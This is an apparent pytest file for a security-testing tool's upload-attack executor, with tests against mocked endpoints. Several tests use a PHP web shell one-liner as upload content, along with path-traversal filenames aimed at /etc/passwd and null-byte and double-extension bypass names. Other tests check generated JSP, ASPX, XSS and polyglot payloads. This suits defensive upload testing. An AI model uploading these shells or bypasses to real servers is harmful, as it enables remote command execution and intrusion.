"""Tests for file upload bypass detection and multipart handling."""

import pytest
import respx
import httpx
from chaos_kitten.paws.executor import Executor


@pytest.fixture
def base_url():
    return "http://api.example.com"


# --- Multipart Form Data Upload Tests ---


@pytest.mark.asyncio
async def test_multipart_form_upload_basic(base_url):
    """Test basic multipart form-data file upload."""
    files = {
        "file": ("test.txt", b"test content", "text/plain")
    }
    
    async with Executor(base_url=base_url) as executor:
        async with respx.mock(base_url=base_url) as mock:
            mock.post("/upload").respond(201, json={"filename": "test.txt", "size": 12})
            
            result = await executor.execute_multipart_attack(
                "POST",
                "/upload",
                files=files
            )
            
            assert result["status_code"] == 201
            assert result["error"] is None
            assert "test.txt" in result["body"]


@pytest.mark.asyncio
async def test_multipart_form_upload_with_data_fields(base_url):
    """Test multipart upload with additional form fields."""
    files = {
        "avatar": ("profile.jpg", b"\xFF\xD8\xFF\xE0", "image/jpeg")
    }
    data = {
        "user_id": "123",
        "description": "Profile picture"
    }
    
    async with Executor(base_url=base_url) as executor:
        async with respx.mock(base_url=base_url) as mock:
            mock.post("/users/123/avatar").respond(200, json={"status": "updated"})
            
            result = await executor.execute_multipart_attack(
                "POST",
                "/users/123/avatar",
                files=files,
                data=data
            )
            
            assert result["status_code"] == 200
            assert result["error"] is None


@pytest.mark.asyncio
async def test_multipart_upload_multiple_files(base_url):
    """Test multipart upload with multiple files."""
    files = {
        "documents": ("doc1.pdf", b"PDF content", "application/pdf"),
        "images": ("image1.jpg", b"\xFF\xD8\xFF\xE0", "image/jpeg")
    }
    
    async with Executor(base_url=base_url) as executor:
        async with respx.mock(base_url=base_url) as mock:
            mock.post("/batch-upload").respond(
                200,
                json={"files_uploaded": 2, "total_size": 30}
            )
            
            result = await executor.execute_multipart_attack(
                "POST",
                "/batch-upload",
                files=files
            )
            
            assert result["status_code"] == 200
            assert result["error"] is None


@pytest.mark.asyncio
async def test_multipart_upload_with_auth(base_url):
    """Test multipart upload with authentication."""
    token = "auth_token_123"
    files = {
        "file": ("document.txt", b"sensitive document", "text/plain")
    }
    
    async with Executor(
        base_url=base_url,
        auth_type="bearer",
        auth_token=token
    ) as executor:
        async with respx.mock(base_url=base_url) as mock:
            route = mock.post("/protected-upload")
            route.respond(201)
            
            result = await executor.execute_multipart_attack(
                "POST",
                "/protected-upload",
                files=files
            )
            
            assert result["status_code"] == 201
            headers = route.calls.last.request.headers
            assert headers["Authorization"] == f"Bearer {token}"


# --- File Payload Generation Tests ---


def test_create_test_payload_php_shell():
    """Test PHP shell payload generation."""
    payload = Executor.create_test_payload("php_shell")
    assert b"<?php" in payload
    assert b"system" in payload
    assert b"GET" in payload


def test_create_test_payload_html_xss():
    """Test HTML/XSS payload generation."""
    payload = Executor.create_test_payload("html_xss")
    assert b"<html>" in payload
    assert b"<script>" in payload
    assert b"XSS" in payload


def test_create_test_payload_jsp_shell():
    """Test JSP shell payload generation."""
    payload = Executor.create_test_payload("jsp_shell")
    assert b"<%@" in payload
    assert b"page" in payload or b"import" in payload


def test_create_test_payload_aspx_shell():
    """Test ASP.NET shell payload generation."""
    payload = Executor.create_test_payload("aspx_shell")
    assert b"<%@" in payload
    assert b"Page" in payload


def test_create_test_payload_polyglot_php_jpg():
    """Test polyglot PHP/JPEG payload generation."""
    payload = Executor.create_test_payload("polyglot_php_jpg")
    # Should have JPEG header
    assert payload.startswith(b"\xFF\xD8\xFF\xE0")
    # Should have PHP code
    assert b"<?php" in payload
    # Should have JPEG trailer
    assert payload.endswith(b"\xFF\xD9")


def test_create_test_payload_empty():
    """Test empty payload generation."""
    payload = Executor.create_test_payload("empty")
    assert payload == b""


def test_create_test_payload_text():
    """Test text payload generation."""
    payload = Executor.create_test_payload("text")
    assert b"test file" in payload


def test_create_test_payload_path_traversal():
    """Test path traversal payload generation."""
    payload = Executor.create_test_payload("path_traversal")
    assert b".." in payload
    assert b"etc/passwd" in payload


def test_create_test_payload_unknown_type():
    """Test unknown payload type returns default content."""
    payload = Executor.create_test_payload("unknown_type")
    assert payload == b"test content"


# --- Filename Bypass Generation Tests ---


def test_create_filename_bypass_double_extension():
    """Test double extension bypass."""
    filename = Executor.create_filename_bypass("shell.php", "double_extension")
    assert filename == "shell.php.jpg"


def test_create_filename_bypass_reverse_extension():
    """Test reverse extension bypass."""
    filename = Executor.create_filename_bypass("shell.php", "reverse_extension")
    assert filename == "shell.jpg.php"


def test_create_filename_bypass_null_byte():
    """Test null byte injection bypass."""
    filename = Executor.create_filename_bypass("shell.php", "null_byte")
    assert filename == "shell.php%00.jpg"


def test_create_filename_bypass_trailing_dot():
    """Test trailing dot bypass."""
    filename = Executor.create_filename_bypass("shell.php", "trailing_dot")
    assert filename == "shell.php."


def test_create_filename_bypass_trailing_space():
    """Test trailing space bypass."""
    filename = Executor.create_filename_bypass("shell.php", "trailing_space")
    assert filename == "shell.php%20"


def test_create_filename_bypass_alt_php_ext():
    """Test alternative PHP extension bypass."""
    filename = Executor.create_filename_bypass("shell.php", "alt_php_ext")
    assert filename == "shell.php5"


def test_create_filename_bypass_path_traversal():
    """Test path traversal bypass."""
    filename = Executor.create_filename_bypass("shell.php", "path_traversal")
    assert filename == "../../../shell.php"


def test_create_filename_bypass_windows_path_traversal():
    """Test Windows path traversal bypass."""
    filename = Executor.create_filename_bypass("shell.php", "windows_path_traversal")
    assert filename == "..\\..\\..\\shell.php"


def test_create_filename_bypass_case_variation():
    """Test case variation bypass."""
    filename = Executor.create_filename_bypass("shell.php", "case_variation")
    assert filename == "shell.PHP"


def test_create_filename_bypass_unknown_type():
    """Test unknown bypass type returns original filename."""
    filename = Executor.create_filename_bypass("shell.php", "unknown_type")
    assert filename == "shell.php"


def test_create_filename_bypass_no_extension():
    """Test filename bypass with no extension."""
    filename = Executor.create_filename_bypass("shell", "double_extension")
    # Should handle gracefully
    assert "shell" in filename


# --- MIME Type Spoofing Tests ---


@pytest.mark.asyncio
async def test_mime_type_spoofing_php_as_image(base_url):
    """Test uploading PHP code with image MIME type."""
    files = {
        "file": ("shell.php", b"<?php system($_GET['cmd']); ?>", "image/jpeg")
    }
    
    async with Executor(base_url=base_url) as executor:
        async with respx.mock(base_url=base_url) as mock:
            mock.post("/upload").respond(201, json={"filename": "shell.php"})
            
            result = await executor.execute_multipart_attack(
                "POST",
                "/upload",
                files=files
            )
            
            assert result["status_code"] == 201


@pytest.mark.asyncio
async def test_mime_type_spoofing_executable_as_text(base_url):
    """Test uploading executable with text MIME type."""
    files = {
        "document": ("script.exe", b"MZ\x90\x00", "text/plain")
    }
    
    async with Executor(base_url=base_url) as executor:
        async with respx.mock(base_url=base_url) as mock:
            mock.post("/upload").respond(400, json={"error": "Invalid file"})
            
            result = await executor.execute_multipart_attack(
                "POST",
                "/upload",
                files=files
            )
            
            # Secure servers should reject this
            assert result["status_code"] == 400


# --- Extension Filtering Bypass Tests ---


@pytest.mark.asyncio
async def test_extension_bypass_double_extension(base_url):
    """Test double extension bypass (shell.php.jpg)."""
    files = {
        "file": (
            "shell.php.jpg",
            b"<?php system($_GET['cmd']); ?>",
            "image/jpeg"
        )
    }
    
    async with Executor(base_url=base_url) as executor:
        async with respx.mock(base_url=base_url) as mock:
            mock.post("/upload").respond(201, json={"filename": "shell.php.jpg"})
            
            result = await executor.execute_multipart_attack(
                "POST",
                "/upload",
                files=files
            )
            
            assert result["status_code"] == 201


@pytest.mark.asyncio
async def test_extension_bypass_null_byte(base_url):
    """Test null byte injection bypass."""
    files = {
        "file": (
            "shell.php%00.jpg",
            b"<?php system($_GET['cmd']); ?>",
            "image/jpeg"
        )
    }
    
    async with Executor(base_url=base_url) as executor:
        async with respx.mock(base_url=base_url) as mock:
            mock.post("/upload").respond(201)
            
            result = await executor.execute_multipart_attack(
                "POST",
                "/upload",
                files=files
            )
            
            # Modern servers should reject this
            assert result["status_code"] >= 400 or result["status_code"] == 201


# --- Path Traversal in Upload Tests ---


@pytest.mark.asyncio
async def test_path_traversal_in_upload_filename(base_url):
    """Test path traversal in upload filename."""
    files = {
        "file": (
            "../../../etc/passwd",
            b"root:x:0:0::::",
            "text/plain"
        )
    }
    
    async with Executor(base_url=base_url) as executor:
        async with respx.mock(base_url=base_url) as mock:
            mock.post("/upload").respond(400, json={"error": "Invalid path"})
            
            result = await executor.execute_multipart_attack(
                "POST",
                "/upload",
                files=files
            )
            
            # Secure servers should reject this
            assert result["status_code"] >= 400 or result["error"] is not None


# --- File Size Handling Tests ---


@pytest.mark.asyncio
async def test_upload_empty_file(base_url):
    """Test uploading empty file."""
    files = {
        "file": ("empty.txt", b"", "text/plain")
    }
    
    async with Executor(base_url=base_url) as executor:
        async with respx.mock(base_url=base_url) as mock:
            mock.post("/upload").respond(201)
            
            result = await executor.execute_multipart_attack(
                "POST",
                "/upload",
                files=files
            )
            
            assert result["status_code"] == 201


@pytest.mark.asyncio
async def test_upload_large_file(base_url):
    """Test uploading file exceeding size limit."""
    # 100MB file
    large_content = b"x" * (100 * 1024 * 1024)
    files = {
        "file": ("large.bin", large_content, "application/octet-stream")
    }
    
    async with Executor(base_url=base_url) as executor:
        async with respx.mock(base_url=base_url) as mock:
            # Simulate 413 Payload Too Large
            mock.post("/upload").respond(413, json={"error": "File too large"})
            
            result = await executor.execute_multipart_attack(
                "POST",
                "/upload",
                files=files
            )
            
            assert result["status_code"] == 413


# --- Error Handling Tests ---


@pytest.mark.asyncio
async def test_multipart_upload_timeout(base_url):
    """Test multipart upload timeout handling."""
    files = {
        "file": ("test.txt", b"content", "text/plain")
    }
    
    async with Executor(base_url=base_url, timeout=1) as executor:
        async with respx.mock(base_url=base_url) as mock:
            # Simulate slow response
            mock.post("/upload").side_effect = httpx.TimeoutException("timeout")
            
            result = await executor.execute_multipart_attack(
                "POST",
                "/upload",
                files=files
            )
            
            assert result["error"] is not None
            assert "timeout" in result["error"].lower()


@pytest.mark.asyncio
async def test_multipart_upload_connection_error(base_url):
    """Test multipart upload connection error handling."""
    files = {
        "file": ("test.txt", b"content", "text/plain")
    }
    
    async with Executor(base_url=base_url) as executor:
        async with respx.mock(base_url=base_url) as mock:
            mock.post("/upload").side_effect = httpx.ConnectError("Connection refused")
            
            result = await executor.execute_multipart_attack(
                "POST",
                "/upload",
                files=files
            )
            
            assert result["error"] is not None
            assert "connection" in result["error"].lower()


@pytest.mark.asyncio
async def test_multipart_upload_without_client(base_url):
    """Test multipart upload fails gracefully without client."""
    files = {
        "file": ("test.txt", b"content", "text/plain")
    }
    
    executor = Executor(base_url=base_url)
    # Note: Not using context manager, so client is not initialized
    
    result = await executor.execute_multipart_attack(
        "POST",
        "/upload",
        files=files
    )
    
    assert result["status_code"] == 0
    assert "not initialized" in result["error"]
